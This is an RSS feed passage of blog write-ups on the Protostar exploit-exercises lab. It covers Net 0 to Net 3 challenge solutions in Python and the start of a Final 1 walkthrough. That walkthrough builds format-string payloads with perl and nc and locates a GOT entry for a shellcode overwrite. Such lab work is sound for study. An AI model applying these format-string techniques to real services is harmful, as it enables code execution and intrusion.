+      <description>&lt;p&gt;The last in the Net series of &lt;a href=&#34;http://exploit-exercises.com/protostar&#34;&gt;Protostar&lt;/a&gt; is &lt;a href=&#34;http://exploit-exercises.com/protostar/net3&#34;&gt;Net 3&lt;/a&gt;.  It was of course the most difficult of all of them.  However, it still wasn&amp;rsquo;t too bad.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;First, we&amp;rsquo;re given the following code:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;quot;../common/common.c&amp;quot;
+
+#define NAME &amp;quot;net3&amp;quot;
+#define UID 996
+#define GID 996
+#define PORT 2996
+
+/*
+ * Extract a null terminated string from the buffer 
+ */
+
+int get_string(char **result, unsigned char *buffer, u_int16_t len)
+{
+ unsigned char byte;
+
+ byte = *buffer;
+
+ if(byte &amp;gt; len) errx(1, &amp;quot;badly formed packet&amp;quot;);
+ *result = malloc(byte);
+ strcpy(*result, buffer + 1);
+
+ return byte + 1;
+}
+
+/*
+ * Check to see if we can log into the host
+ */
+
+int login(unsigned char *buffer, u_int16_t len)
+{
+ char *resource, *username, *password;
+ int deduct;
+ int success;
+
+ if(len &amp;lt; 3) errx(1, &amp;quot;invalid login packet length&amp;quot;);
+
+ resource = username = password = NULL;
+
+ deduct = get_string(&amp;amp;resource, buffer, len);
+ deduct += get_string(&amp;amp;username, buffer+deduct, len-deduct);
+ deduct += get_string(&amp;amp;password, buffer+deduct, len-deduct);
+
+ success = 0;
+ success |= strcmp(resource, &amp;quot;net3&amp;quot;);
+ success |= strcmp(username, &amp;quot;awesomesauce&amp;quot;);
+ success |= strcmp(password, &amp;quot;password&amp;quot;);
+
+ free(resource);
+ free(username);
+ free(password);
+
+ return ! success;
+}
+
+void send_string(int fd, unsigned char byte, char *string)
+{
+ struct iovec v[3];
+ u_int16_t len;
+ int expected;
+
+ len = ntohs(1 + strlen(string));
+
+ v[0].iov_base = &amp;amp;len;
+ v[0].iov_len = sizeof(len);
+
+ v[1].iov_base = &amp;amp;byte;
+ v[1].iov_len = 1;
+
+ v[2].iov_base = string;
+ v[2].iov_len = strlen(string);
+
+ expected = sizeof(len) + 1 + strlen(string);
+
+ if(writev(fd, v, 3) != expected) errx(1, &amp;quot;failed to write correct amount of bytes&amp;quot;);
+
+}
+
+void run(int fd)
+{
+ u_int16_t len;
+ unsigned char *buffer;
+ int loggedin;
+
+ while(1) {
+  nread(fd, &amp;amp;len, sizeof(len));
+  len = ntohs(len);
+  buffer = malloc(len);
+
+  if(! buffer) errx(1, &amp;quot;malloc failure for %d bytes&amp;quot;, len);
+
+  nread(fd, buffer, len);
+
+  switch(buffer[0]) {
+   case 23: 
+    loggedin = login(buffer + 1, len - 1);
+    send_string(fd, 33, loggedin ? &amp;quot;successful&amp;quot; : &amp;quot;failed&amp;quot;);
+    break;
+
+   default:
+    send_string(fd, 58, &amp;quot;what you talkin about willis?&amp;quot;);
+    break;
+  }
+ }
+}
+
+int main(int argc, char **argv, char **envp)
+{
+ int fd;
+ char *username;
+
+ /* Run the process as a daemon */
+ background_process(NAME, UID, GID); 
+
+ /* Wait for socket activity and return */
+ fd = serve_forever(PORT);
+
+ /* Set the client socket to STDIN, STDOUT, and STDERR */
+ set_io(fd);
+
+ /* Don&#39;t do this :&amp;gt; */
+ srandom(time(NULL));
+
+ run(fd);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now because my C is a bit rusty, and I didn&amp;rsquo;t always understand what was going on well, I re-wrote some of it to look like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+
+int get_string(char **result, unsigned char *buffer, u_int16_t len)
+{
+        unsigned char byte;
+
+        byte = *buffer;
+
+        printf(&amp;quot;[*] Byte as hex: %x\n&amp;quot;, byte);
+
+        if(byte &amp;gt; len)
+        {
+                printf(&amp;quot;[*] Culprit: %s. %x is greater than %x\n&amp;quot;, &amp;amp;buffer, byte, len);
+                errx(1, &amp;quot;badly formed packet&amp;quot;);
+        }
+        *result = malloc(byte);
+        strcpy(*result, buffer + 1);
+
+        printf(&amp;quot;[*] Returning: %i\n&amp;quot;, byte+1);
+        return byte + 1;
+}
+
+int login(unsigned char *buffer, u_int16_t len)
+{
+        char *resource, *username, *password;
+        int deduct;
+        int success;
+
+        if(len &amp;lt; 3) errx(1, &amp;quot;invalid login packet length&amp;quot;);
+
+        resource = username = password = NULL;
+
+        deduct = get_string(&amp;amp;resource, buffer, len);
+        deduct += get_string(&amp;amp;username, buffer+deduct, len-deduct);
+        deduct += get_string(&amp;amp;password, buffer+deduct, len-deduct);
+
+        printf(&amp;quot;Resource: %s\n&amp;quot;, resource);
+        printf(&amp;quot;Username: %s\n&amp;quot;, username);
+        printf(&amp;quot;Password: %s\n&amp;quot;, password);
+
+        success = 0;
+        success |= strcmp(resource, &amp;quot;net3&amp;quot;);
+        printf(&amp;quot;[*] Success (iteration 1): %x\n&amp;quot;, success);
+
+        success |= strcmp(username, &amp;quot;awesomesauce&amp;quot;);
+        printf(&amp;quot;[*] Success (iteration 2): %x\n&amp;quot;, success);
+
+        success |= strcmp(password, &amp;quot;password&amp;quot;);
+        printf(&amp;quot;[*] Success (iteration 3): %x\n&amp;quot;, success);
+
+
+        free(resource);
+        free(username);
+        free(password);
+
+        return ! success;
+}
+
+void main(int argc, char **argv)
+{
+        unsigned char *buffer;
+        u_int16_t len;
+        int loggedin;
+
+        buffer = &amp;quot;string values go here yo&amp;quot;;
+
+        len = strlen(buffer);
+
+        loggedin = login(buffer, len);
+        printf(&amp;quot;[*] Logged in: %x\n&amp;quot;, loggedin);
+
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This allowed me to get a LOT more debug information, and not worry about my python program failing somewhere.&lt;/p&gt;
+
+&lt;p&gt;In my analysis, I found this program to be the most complicated (of course).  It has a daemon running on port 2996.  It needs a login string to be sent to it just perfectly.  That login string needs to have the first byte be in little-endian format, the length of the login string.  Then each of the 3 strings, the resource, username, and password, must be sent with their length in little-endian prepended to them, and a null string terminator appended. However, before any of that login string is sent, it needs a control character of &amp;ldquo;\x17&amp;rdquo; (23) to go into the login logic.&lt;/p&gt;
+
+&lt;p&gt;Eventually, I ended up with the following code:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
+
+# Protostar Net 3
+# http://exploit-exercises.com/protostar/net3
+# Matt Andreko
+# twitter: @mandreko
+# contact: matt [at] mattandreko.com
+
+from socket import *
+from struct import *
+from optparse import OptionParser
+import select
+
+def main(host, port):
+
+ s = socket(AF_INET, SOCK_STREAM)
+ s.connect((host, port))
+ 
+ login_string = (&amp;quot;\x17&amp;quot; # \x17 = 23, which lets us by the switch statement.
+                        # It appears to be a control character
+     &amp;quot;\x05net3\x00&amp;quot; # Send the resource name, prepended with 
+                    #it&#39;s length in hex, and appended with a null
+                    # byte
+     &amp;quot;\x0dawesomesauce\x00&amp;quot; # Send the user name, prepended with
+                            # it&#39;s length in hex, and appended
+                            # with a null byte
+     &amp;quot;\x0apassword\x00&amp;quot;) # Send the password, prepended with
+                         # it&#39;s length in hex, and appended 
+                         # with a null byte
+
+ login_length = len(login_string) # The initial byte needs to be the length
+                                  # of the entire login string, so that it
+                                  # knows how much memory to malloc()
+
+ s.send(pack(&amp;quot;&amp;gt;H&amp;quot;, login_length))
+ 
+ s.send(login_string)
+ 
+ print s.recv(1024)
+ 
+ s.close()
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
+    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;, 
+     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
+    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=2996, 
+     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)
+
+    (options, args) = parser.parse_args()
+    
+    main(options.hostname, options.portnum)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When I run that code, I get:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;C:\Protostar&amp;gt;net3.py -H 192.168.1.132
+ ♂!successful
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That is the last of all the Net challenges that I see documented.  But I do wonder, since in the virtual machine, there is a net4 binary. :)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Exploit Exercises - Protostar Net 2</title>
+      <link>https://www.mattandreko.com/blog/2012-02-10-exploit-exercises-protostar-net-2/</link>
+      <pubDate>Fri, 10 Feb 2012 05:19:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-02-10-exploit-exercises-protostar-net-2/</guid>
+      <description>&lt;p&gt;So far, these Net challenges in &lt;a href=&#34;http://exploit-exercises.com/protostar&#34;&gt;Protostar&lt;/a&gt; have been pretty easy.  This challenge, &lt;a href=&#34;http://exploit-exercises.com/protostar/net2&#34;&gt;Net 2&lt;/a&gt; got a small bit tougher.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;We are given the following code:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;quot;../common/common.c&amp;quot;
+
+#define NAME &amp;quot;net2&amp;quot;
+#define UID 997
+#define GID 997
+#define PORT 2997
+
+void run()
+{
+ unsigned int quad[4];
+ int i;
+ unsigned int result, wanted;
+
+ result = 0;
+ for(i = 0; i &amp;lt; 4; i++) {
+  quad[i] = random();
+  result += quad[i];
+
+  if(write(0, &amp;amp;(quad[i]), sizeof(result)) != sizeof(result)) { 
+   errx(1, &amp;quot;:(\n&amp;quot;);
+  }
+ }
+
+ if(read(0, &amp;amp;wanted, sizeof(result)) != sizeof(result)) {
+  errx(1, &amp;quot;:&amp;lt;\n&amp;quot;);
+ }
+
+
+ if(result == wanted) {
+  printf(&amp;quot;you added them correctly\n&amp;quot;);
+ } else {
+  printf(&amp;quot;sorry, try again. invalid\n&amp;quot;);
+ }
+}
+
+int main(int argc, char **argv, char **envp)
+{
+ int fd;
+ char *username;
+
+ /* Run the process as a daemon */
+ background_process(NAME, UID, GID); 
+
+ /* Wait for socket activity and return */
+ fd = serve_forever(PORT);
+
+ /* Set the client socket to STDIN, STDOUT, and STDERR */
+ set_io(fd);
+
+ /* Don&#39;t do this :&amp;gt; */
+ srandom(time(NULL));
+
+ run();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From this code, we can see a daemon is listening on port 2997.  It is going to output 4 random unsigned integers in little-endian format.  It then will expect the sum of all 4 of those integers to be returned in little-endian format.&lt;/p&gt;
+
+&lt;p&gt;I was able to solve this with the following code:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
+
+# Protostar Net 2
+# http://exploit-exercises.com/protostar/net2
+# Matt Andreko
+# twitter: @mandreko
+# contact: matt [at] mattandreko.com
+
+from socket import *
+from struct import *
+from optparse import OptionParser
+
+def main(host, port):
+
+ s = socket(AF_INET, SOCK_STREAM)
+ s.connect((host, port))
+
+ sum = 0
+
+ # Loop over the 4 unsigned integers being read in, and them to &amp;quot;sum&amp;quot;
+ for x in range(4):
+  data = s.recv(4)
+  little_endian = int(unpack(&amp;quot;&amp;lt;I&amp;quot;, data)[0])
+  print &amp;quot;[*] integer &amp;quot; + str(x) + &amp;quot;: &amp;quot; + str(little_endian)
+  sum += little_endian
+
+ print &amp;quot;[*] Sum: &amp;quot; + str(sum)
+
+ # Handle integer overflow by doing a logical AND with 0xffffffff
+ sum &amp;amp;= 0xffffffff
+
+ # Convert the sum back to little-endian, to send back over the wire
+ sum_packed = pack(&amp;quot;&amp;lt;I&amp;quot;, sum)
+
+ s.send(sum_packed)
+ print s.recv(1024)
+
+ s.close()
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
+    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;, 
+     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
+    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=2997, 
+     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)
+
+    (options, args) = parser.parse_args()
+    
+    main(options.hostname, options.portnum)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When I run that code, I get the following output: &lt;pre class=&#34;brush: plain&#34;&gt;
+C:\Protostar&amp;gt;net2.py -H 192.168.1.132
+[&lt;em&gt;] integer 0: 1724850170
+[&lt;/em&gt;] integer 1: 692469090
+[&lt;em&gt;] integer 2: 630776982
+[&lt;/em&gt;] integer 3: 1691529294
+[*] Sum: 4739625536
+you added them correctly
+```&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Exploit Exercises - Protostar Net 1</title>
+      <link>https://www.mattandreko.com/blog/2012-02-09-exploit-exercises-protostar-net-1/</link>
+      <pubDate>Thu, 09 Feb 2012 05:43:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-02-09-exploit-exercises-protostar-net-1/</guid>
+      <description>&lt;p&gt;Continuing with the &amp;ldquo;Net&amp;rdquo; series of &lt;a href=&#34;http://exploit-exercises.com/protostar&#34;&gt;Protostar&lt;/a&gt;, is Net 1.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;We are given the following code:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;quot;../common/common.c&amp;quot;
+
+#define NAME &amp;quot;net1&amp;quot;
+#define UID 998
+#define GID 998
+#define PORT 2998
+
+void run()
+{
+ char buf[12];
+ char fub[12];
+ char *q;
+
+ unsigned int wanted;
+
+ wanted = random();
+
+ sprintf(fub, &amp;quot;%d&amp;quot;, wanted);
+
+ if(write(0, &amp;amp;wanted, sizeof(wanted)) != sizeof(wanted)) { 
+  errx(1, &amp;quot;:(\n&amp;quot;);
+ }
+
+ if(fgets(buf, sizeof(buf)-1, stdin) == NULL) {
+  errx(1, &amp;quot;:(\n&amp;quot;);
+ }
+
+ q = strchr(buf, &#39;\r&#39;); if(q) *q = 0;
+ q = strchr(buf, &#39;\n&#39;); if(q) *q = 0;
+
+ if(strcmp(fub, buf) == 0) {
+  printf(&amp;quot;you correctly sent the data\n&amp;quot;);
+ } else {
+  printf(&amp;quot;you didn&#39;t send the data properly\n&amp;quot;);
+ }
+}
+
+int main(int argc, char **argv, char **envp)
+{
+ int fd;
+ char *username;
+
+ /* Run the process as a daemon */
+ background_process(NAME, UID, GID); 
+
+ /* Wait for socket activity and return */
+ fd = serve_forever(PORT);
+
+ /* Set the client socket to STDIN, STDOUT, and STDERR */
+ set_io(fd);
+
+ /* Don&#39;t do this :&amp;gt; */
+ srandom(time(NULL));
+
+ run();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Similar to Net 0, it looks like this is another network daemon, this time running on port 2998.  It creates a random number (&amp;ldquo;wanted&amp;rdquo;).  It then outputs that in little-endian format, which it then expects to be returned to it in an ASCII string.&lt;/p&gt;
+
+&lt;p&gt;I wrote up the following code to do exactly that:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
+
+# Protostar Net 1
+# http://exploit-exercises.com/protostar/net1
+# Matt Andreko
+# twitter: @mandreko
+# contact: matt [at] mattandreko.com
+
+from socket import *
+from struct import *
+from optparse import OptionParser
+
+def main(host, port):
+
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect((host, port))
+
+    # Read in the data
+    data = s.recv(1024)
+    print &amp;quot;[*] Data: &amp;quot; + data
+
+    # Convert it from little-endian to an unsigned integer
+    num = unpack(&amp;quot;&amp;lt;I&amp;quot;, data)[0]
+    print &amp;quot;[*] Unpacked: &amp;quot; + str(num)
+
+    #Send the ASCII representation back
+    s.send(str(num))
+
+    # Read response from server
+    print s.recv(1024)
+    s.close()
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
+    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;, 
+        type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
+    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=2998, 
+        type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)
+
+    (options, args) = parser.parse_args()
+    
+    main(options.hostname, options.portnum)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The output from the program looks like:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+C:\Protostar&amp;gt;net1.py -H 192.168.1.132
+[*] Data: H&amp;lt;Çy
+[*] Unpacked: 2038447176
+you correctly sent the data
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Exploit Exercises - Protostar Net 0</title>
+      <link>https://www.mattandreko.com/blog/2012-02-08-exploit-exercises-protostar-net-0/</link>
+      <pubDate>Wed, 08 Feb 2012 18:31:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-02-08-exploit-exercises-protostar-net-0/</guid>
+      <description>&lt;p&gt;I recently started looking at the &amp;ldquo;Net&amp;rdquo; problems in &lt;a href=&#34;http://exploit-exercises.com/protostar&#34;&gt;Protostar&lt;/a&gt;, and found them to be quite a fun change in pace.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;Starting with &lt;a href=&#34;http://exploit-exercises.com/protostar/net0&#34;&gt;Net 0&lt;/a&gt;, we are given the following code:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;quot;../common/common.c&amp;quot;
+
+#define NAME &amp;quot;net0&amp;quot;
+#define UID 999
+#define GID 999
+#define PORT 2999
+
+void run()
+{
+ unsigned int i;
+ unsigned int wanted;
+
+ wanted = random();
+
+ printf(&amp;quot;Please send &#39;%d&#39; as a little endian 32bit int\n&amp;quot;, wanted);
+
+ if(fread(&amp;amp;i, sizeof(i), 1, stdin) == NULL) {
+  errx(1, &amp;quot;:(\n&amp;quot;);
+ }
+
+ if(i == wanted) {
+  printf(&amp;quot;Thank you sir/madam\n&amp;quot;);
+ } else {
+  printf(&amp;quot;I&#39;m sorry, you sent %d instead\n&amp;quot;, i);
+ }
+}
+
+int main(int argc, char **argv, char **envp)
+{
+ int fd;
+ char *username;
+
+ /* Run the process as a daemon */
+ background_process(NAME, UID, GID); 
+
+ /* Wait for socket activity and return */
+ fd = serve_forever(PORT);
+
+ /* Set the client socket to STDIN, STDOUT, and STDERR */
+ set_io(fd);
+
+ /* Don&#39;t do this :&amp;gt; */
+ srandom(time(NULL));
+
+ run();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I started to analyze this program, to figure out what I was even supposed to do.  It looks like it&amp;rsquo;s a daemon that runs on port 2999.  When a connection is established, it will send a number, asking for it to be returned in little endian format.  It will either then display &amp;ldquo;Thank you sir/madam&amp;rdquo; or &amp;ldquo;I&amp;rsquo;m sorry, you send X instead&amp;rdquo;.  My goal was the prior.&lt;/p&gt;
+
+&lt;p&gt;I ended up creating the following code to convert the number to little endian and send it back:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
+
+# Protostar Net 0
+# http://exploit-exercises.com/protostar/net0
+# Matt Andreko
+# twitter: @mandreko
+# contact: matt [at] mattandreko.com
+
+from socket import *
+from struct import *
+from optparse import OptionParser
+
+def main(host, port):
+
+ # Open a connection and read
+ s = socket(AF_INET, SOCK_STREAM)
+ s.connect((host, port))
+
+ data = s.recv(1024)
+ print &amp;quot;[*] Data: &amp;quot; + data
+
+ # Find the numeric string.
+ # Note it can be variable length, so search between quotes
+ start = data.find(&amp;quot;&#39;&amp;quot;) + 1
+ end = data.find(&amp;quot;&#39;&amp;quot;, start)
+
+ num = int(data[start:end])
+ print &amp;quot;[*] Num: &amp;quot; + str(num)
+
+ # Convert the number to little endian format and send it back
+ little = pack(&amp;quot;&amp;lt;I&amp;quot;, num)
+ s.send(little)
+
+ # Read response from server
+ print s.recv(1024)
+ s.close()
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
+    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;, 
+     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
+    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=2999, 
+     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)
+
+    (options, args) = parser.parse_args()
+    
+    main(options.hostname, options.portnum)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When ran, that program produced the following output:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;C:\Protostar&amp;gt;net0.py -H 192.168.1.132
+[*] Data: Please send &#39;634513062&#39; as a little endian 32bit int
+
+[*] Num: 634513062
+Thank you sir/madam
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Exploit Exercises - Protostar Final 1</title>
+      <link>https://www.mattandreko.com/blog/2012-02-05-exploit-exercises-protostar-final-1/</link>
+      <pubDate>Sun, 05 Feb 2012 15:15:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-02-05-exploit-exercises-protostar-final-1/</guid>
+      <description>&lt;p&gt;Since I&amp;rsquo;ve been doing a lot of the format string exploits lately, I decided to do the &lt;a href=&#34;http://exploit-exercises.com/protostar/final1&#34;&gt;Final 1&lt;/a&gt; challenge.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;We start out the challenge by being given the following code:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;quot;../common/common.c&amp;quot;
+
+#include &amp;lt;syslog.h&amp;gt;
+
+#define NAME &amp;quot;final1&amp;quot;
+#define UID 0
+#define GID 0
+#define PORT 2994
+
+char username[128];
+char hostname[64];
+
+void logit(char *pw)
+{
+ char buf[512];
+
+ snprintf(buf, sizeof(buf), &amp;quot;Login from %s as [%s] with password [%s]\n&amp;quot;, hostname, username, pw);
+
+ syslog(LOG_USER|LOG_DEBUG, buf);
+}
+
+void trim(char *str)
+{
+ char *q;
+
+ q = strchr(str, &#39;\r&#39;);
+ if(q) *q = 0;
+ q = strchr(str, &#39;\n&#39;);
+ if(q) *q = 0;
+}
+
+void parser()
+{
+ char line[128];
+
+ printf(&amp;quot;[final1] $ &amp;quot;);
+
+ while(fgets(line, sizeof(line)-1, stdin)) {
+  trim(line);
+  if(strncmp(line, &amp;quot;username &amp;quot;, 9) == 0) {
+   strcpy(username, line+9);
+  } else if(strncmp(line, &amp;quot;login &amp;quot;, 6) == 0) {
+   if(username[0] == 0) {
+    printf(&amp;quot;invalid protocol\n&amp;quot;);
+   } else {
+    logit(line + 6);
+    printf(&amp;quot;login failed\n&amp;quot;);
+   }
+  }
+  printf(&amp;quot;[final1] $ &amp;quot;);
+ }
+}
+
+void getipport()
+{
+ int l;
+ struct sockaddr_in sin;
+
+ l = sizeof(struct sockaddr_in);
+ if(getpeername(0, &amp;amp;sin, &amp;amp;l) == -1) {
+  err(1, &amp;quot;you don&#39;t exist&amp;quot;);
+ }
+
+ sprintf(hostname, &amp;quot;%s:%d&amp;quot;, inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
+}
+
+int main(int argc, char **argv, char **envp)
+{
+ int fd;
+ char *username;
+
+ /* Run the process as a daemon */
+ background_process(NAME, UID, GID); 
+
+ /* Wait for socket activity and return */
+ fd = serve_forever(PORT);
+
+ /* Set the client socket to STDIN, STDOUT, and STDERR */
+ set_io(fd);
+
+ getipport();
+ parser();
+
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After analyzing this for a while, I found that it was vulnerable in the logit() function.  If you had given it a username and went to login with a password, it would pass the &amp;ldquo;login&amp;rdquo; string directly to the &amp;ldquo;snprintf&amp;rdquo; funciton.  From there, we could do format string exploits.  There are probably more than one way to solve this, but my method involves overwriting the &amp;ldquo;syslog()&amp;rdquo; function with some shellcode inserted into the stack.&lt;/p&gt;
+
+&lt;p&gt;I started to tinker with the app to see what I could do.  One thing I found really convenient, was to open another terminal throughout this entire process, and watch the syslog.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@protostar:/home/user# tail -f /var/log/syslog | grep final1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This helps to see what is being passed, and align the format string later on.  It also notifies you when you crash the program, and dump the core.&lt;/p&gt;
+
+&lt;p&gt;First, I needed to find the amount of words in the stack that I would need to skip over to get to my format string.  I found through some experimentation that it would start at 15 if I added a 1 character buffer (the &amp;ldquo;X&amp;rdquo;):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ nc localhost 2994
+[final1] $ username XAAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
+[final1] $ login B
+login failed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the syslog, this showed:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Feb  4 22:47:31 protostar final1: Login from 127.0.0.1:36764 as [JAAAA8049ee4.804a2a0.804a220.bffffc46.b7fd7ff4.bffffa98.69676f4c.7266206e.31206d6f.302e3732.312e302e.3736333a.61203436.4a5b2073.41414141] with password [B]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Since my goal was to overwrite &amp;ldquo;syslog()&amp;rdquo; with a memory address pointing to my shellcode, I figured I probably needed to know the address of &amp;ldquo;syslog()&amp;rdquo; in the GOT.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -R final1 | grep syslog
+0804a11c R_386_JUMP_SLOT   syslog
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;My next step was to start using Direct Parameter Access, so my exploit wouldn&amp;rsquo;t be super long, and would be easier to deal with.  I also broke up the segments to make them easier for me to visualize.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;AAAA&amp;quot;.&amp;quot;BBBB&amp;quot;.&amp;quot;CCCC&amp;quot;.&amp;quot;DDDD&amp;quot;.&amp;quot;%15\$x&amp;quot;.&amp;quot;\nlogin B\n&amp;quot;&#39; | nc localhost 2994
+[final1] $ [final1] $ login failed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the syslog, this showed:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Feb  4 23:18:13 protostar final1: Login from 127.0.0.1:36768 as [XAAAABBBBCCCCDDDD41414141] with password [B]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So there, I was still getting the &amp;ldquo;41414141&amp;rdquo; as the word being displayed.  When switched to &amp;ldquo;%n&amp;rdquo; instead of &amp;ldquo;%x&amp;rdquo;, that&amp;rsquo;ll be the address written to.  The next thing to do, would be make all 4 words show up properly.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;AAAA&amp;quot;.&amp;quot;BBBB&amp;quot;.&amp;quot;CCCC&amp;quot;.&amp;quot;DDDD&amp;quot;.&amp;quot;%15\$x&amp;quot;.&amp;quot;%16\$x&amp;quot;.&amp;quot;%17\$x&amp;quot;.&amp;quot;%18\$x&amp;quot;.&amp;quot;\nlogin B\n&amp;quot;&#39; | nc localhost 2994
+[final1] $ [final1] $ login failed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the syslog, this showed:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Feb  4 23:23:17 protostar final1: Login from 127.0.0.1:36769 as [XAAAABBBBCCCCDDDD41414141424242424343434344444444] with password [B]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So you can see, it is now displaying the 4 words that are needed to be overwritten, &amp;ldquo;41414141&amp;rdquo;, &amp;ldquo;42424242&amp;rdquo;, &amp;ldquo;43434343&amp;rdquo;, and &amp;ldquo;44444444&amp;rdquo;.  If the address of &amp;ldquo;syslog()&amp;rdquo; (0x0804a11c) in the GOT is used, instead of these addresses, we can achieve an overwrite of &amp;ldquo;syslog()&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;Just to double-check, I put in the new addresses without the &amp;ldquo;%n&amp;rdquo; so that I could verify nothing was messed up:&lt;/p&gt;
+
